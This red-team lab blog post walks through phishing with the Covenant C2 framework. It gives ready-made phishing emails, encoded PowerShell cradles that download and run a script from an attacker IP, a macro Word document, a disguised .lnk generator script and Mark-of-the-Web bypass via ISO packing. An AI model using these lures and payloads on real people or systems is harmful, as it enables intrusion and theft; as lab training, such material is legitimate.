---
title: "Email Phishing with Covenant"
author: "Trevor Saudi"
date: 2023-03-12
description: "Email Phishing with Covenant"
image: "/posts/2023-03-25_red_team01/images/logo.png"
tags:
- Red Teaming
- Phishing
- Covenant
---
![image](/posts/2023-03-25_red_team01/images/logo.png)


## Introduction

- Phishing attacks have become increasingly sophisticated and prevalent over the years, posing a significant threat to individuals and organizations alike. These attacks aim to steal sensitive information such as login credentials, financial data, and personal information by tricking victims into clicking on malicious links or providing confidential information.
- In this blog, we will explore various techniques and tools used in phishing attacks with a specific focus on Covenant.


## Lab Architecture

- I used the following [github repo](https://github.com/dievus/adgenerator) to build my lab and then manually configure the active directory with the DC, 2 workstations and a mail server.

![image](/posts/2023-03-25_red_team01/images/covenant.jpg)

- You can refer to this step by step [guide](https://05t3.github.io/posts/Active-Directory-Lab-Setup/) by 05t3 on how to setup the lab

{{< alert >}}
You don't need the architecture above to follow through the lab. A kali VM with covenant and a windows VM would suffice
{{</ alert >}}

## Attack Flow

- The attack begins with a password spray to a public-facing mail server compromising a user with the credentials `a.tarolli:Summer2021!`. To gain initial access to the network, the attacker forwards a phishing email to the sender's list of a.tarolli. 
- A user s.chisholm gets compromised in this phishing attack gaining the attacker foothold on the external network where they pivot into the internal network and own the DC.
- Various attacks, enumeration and post-exploitation techniques were conducted by the attacker throughout the lifecycle of the attack. We will look into them in future blogs.
- Let us look into the various techniques the attacker can employ to conduct a successful phishing attack. 


## OutWord Email Phishing with Covenant

### Pretext

- The attacker in this case conducted a spear-phishing campaign where various groups in the organizations receive emails concerning office365 rollouts.
- You can use sample pretexts from [github](https://github.com/L4bF0x/PhishingPretexts/tree/master/Phishing%20Pretexts) to generate your phishing emails.
- I picked the [office365Rollout.html](https://github.com/L4bF0x/PhishingPretexts/blob/master/Phishing%20Pretexts/Office365Rollout.html) for this attack.

```text

SUBJECT: URGENT: Incomplete Security Training

Greetings,

According to our training records, you have not completed the following annual training requirements:

• Information Security Password Policy Training (SA46189)

If these courses are not completed by 30/03/2023, your supervisor will be notified daily until the courses have been completed. We take great pride in maintaining a secure environment, and our annual training requirements play a large role in this success.

Click this link to download the training document

We understand that you and all of our employees here work very hard and maintain busy work schedules. We appreciate your prompt attention to ensure that we all stay within regulatory compliance!

Thanks,

Compliance Department

```

### Payload Generation and Hosting

- We proceed to generate our payload on Covenant. In the listeners tab in Covenant, we create a new listener by clicking `Create`

- Update the IP and create your listener

![image](/posts/2023-03-25_red_team01/images/covenantll.png)

- In the launcher tab, we create a Powershell launcher

{{< alert >}}
Ensure you use high port numbers to prevent Covenant from getting permissions issues
{{< /alert >}}

![image](/posts/2023-03-25_red_team01/images/covenant3.png)

- Configure the launcher options as shown

![image](/posts/2023-03-25_red_team01/images/covenant4.png)

- In the host tab, modify the path name of the launcher, click host to generate the payload 

![image](/posts/2023-03-25_red_team01/images/covenant5.png)


- We are going to create a phishing document using a tool called [Out-Word](https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1)
- Download the script to a windows machine that has Office installed in order to generate a word document with the embedded payload

{{< alert >}}

Out-Word can only work with a windows machine that has office installed 

{{< /alert >}}

- We execute the commands shown to generate the word document. We utilize the payload we created in the above step to create this file


```powershell
PS C:\Users\s.chisholm\Desktop> . .\Out-Word.ps1
PS C:\Users\s.chisholm\Desktop> Out-Word -Payload "powershell -Sta -Nop -Window Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4ANwAyAC8AcgBlAHYALgBwAHMAMQAnACkA" -OutputFile Policies.doc

```

![image](/posts/2023-03-25_red_team01/images/covenant6.png)

- Copy the file from your windows machine back to your attacking machine.
- We proceed to host the malicious payload
- Go to the Listeners section in Covenant. Click create and upload your document


![image](/posts/2023-03-25_red_team01/images/covenant8.png)

- Upload your document and host it on your server

![image](/posts/2023-03-25_red_team01/images/covenant9.png)

- Send the phishing email with an updated link to download the document as shown:

![image](/posts/2023-03-25_red_team01/images/covenant10.png)


### Receiving the connection

- To get the connection back to covenant, the target needs to open the document and enable the macros.
- We login as s.chisholm user on workstation 1

![image](/posts/2023-03-25_red_team01/images/covenant11.png)

- Download the document

![image](/posts/2023-03-25_red_team01/images/covenant12.png)

- Trigger the payload by opening the file and enabling editing. This will execute the embedded payload automatically

![image](/posts/2023-03-25_red_team01/images/covenant13.png)

- We receive the grunt on Covenant

![image](/posts/2023-03-25_red_team01/images/covenant14.png)

- In the Grunts tab, interact with the target by supplying a `WhoAmI` command.

![image](/posts/2023-03-25_red_team01/images/covenant16.png)


## ISO Email Phishing with covenant

- It is common to see malware in various different container formats such as zip, iso, rar, 7z
- There are several reasons to do this, the main being for evading MOTW, which we will discuss below

### MOTW (Mark Of The Web)

- The Mark of the Web is essentially a metadata attribute that is automatically added to files downloaded from the internet by modern browsers. It is represented as a comment in the file's header and contains information about the source of the file and the website from which it was downloaded. It allows web browsers to identify and treat files downloaded from the internet differently from files on the local computer.

- If the file has the Mark of the Web, the browser may restrict certain actions, such as running scripts or executing certain types of code, to protect the user from potential security threats. The browser may also display a warning message to the user to alert them to the potential risks associated with opening the file.

### MOTW Bypass

> - A [research](https://outflank.nl/blog/2020/03/30/mark-of-the-web-from-a-red-teams-perspective/) from 2020 disclosed that some container file formats such as iso, vhd, vhx do not propagate the MOTW flag onto inner files upon auto mount or extraction. - [link](https://github.com/mgeeky/PackMyPayload)

- We can use this [tool](https://github.com/mgeeky/PackMyPayload) to pack payloads into ISO files. It also well documents how threat actors bypass MOTW using ISO files.

### ISO Creation using PackMyPayload

- Let us see how we can generate the ISO files and construct a pretext to send the ISO to our target via email
- For this exercise, we shall generate an executable using Covenant

- In the Launchers tab, select the Binary options as shown

![image](/posts/2023-03-25_red_team01/images/covenant18.png)

- Generate and download the binary file

![image](/posts/2023-03-25_red_team01/images/covenant19.png)

- Pack it using PackMyPayload

![image](/posts/2023-03-25_red_team01/images/covenant20.png)

- Send the email to the target

### Receiving the connection 

- Opening the iso file will reveal the following 

![image](/posts/2023-03-25_red_team01/images/covenant21.png)

- We receive the grunt after executing the file

![image](/posts/2023-03-25_red_team01/images/covenant22.png)


## LNK Phishing

- An .lnk file is a windows shortcut file, simply a pointer to an original file.
- It contains special metadata that can allow us to execute Powershell, VBScript, MSHTA  or even execute commands from another file dropped by the .lnk
- You can easily create an lnk file that runs the powershell encoded command from Covenant to give you a shell as shown:
- Create a shortcut

![image](/posts/2023-03-25_red_team01/images/covenant23.png)

- I made a shortcut to the powershell binary located on C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

![image](/posts/2023-03-25_red_team01/images/covenant24.png)

- It will create your shortcut file. We will proceed to edit some metadata on the shortcut, right click and go to properties

![image](/posts/2023-03-25_red_team01/images/covenant25.png)

- We edit the target to include the powershell payload from Covenant

![image](/posts/2023-03-25_red_team01/images/covenant26.png)

![image](/posts/2023-03-25_red_team01/images/covenant27.png)


{{< alert >}}

I had initially used the encoded launcher in the target but the command was too long, so I used the unencoded version instead

{{< /alert >}}

- Change the icon as well


![image](/posts/2023-03-25_red_team01/images/covenant28.png)

- I selected this `C:\Program Files\Windows Defender\MpCmdRun.exe` and my icon file and it appears as shown

![image](/posts/2023-03-25_red_team01/images/covenant29.png)

- Our malicious lnk looks a bit convincing right?

- The following is a quicker alternative to creating the lnk file. Run the powershell script to generate the malicious lnk

- You may have to customize some of the parameters such as where to dump the lnk file

```powershell
$command = 'Start-Process c:\shell.cmd'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\Users\saudi\Desktop\Q1 Security Update.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files\Windows Defender\MpCmdRun.exe"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand  aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4ANwAyADoAOQAwADAAMAAvAHIAZQB2AC4AcABzADEAJwApAA=="
$link.save()
```
### Packing the lnk 

- We can use packmyload to perform an MOTW bypass and create an iso file that contains the lnk

![image](/posts/2023-03-25_red_team01/images/covenant30.png)

### Pretexting
I used the following pretext

```markdown
Good Morning,

The Infrastructure Team has recently identified a critical security vulnerability in our system and are now rolling out a patch to fix it.

As part of this process, you will be required to download the following Security Update, double click and run the updater. Ignore any warnings

We apologize for any inconvenience caused but rest assured that these measures have been taken to protect you from potential threats. Thank you!
```

![image](/posts/2023-03-25_red_team01/images/covenant31.png)

- Download the iso file and execute the lnk file to get a grunt


## Conclusion

- We have looked into some of the common phishing techniques used during initial access. Although all of them would obviously trigger most security defenses, these are just standard procedures to generate and conduct phishing campaigns. 
- All of the discussed initial access methods can be done with whatever C2 you choose and also different file formats like HTA files.
- In future blogs, we can look into how to generate more covert and complex phishing campaigns that can bypass modern EDRs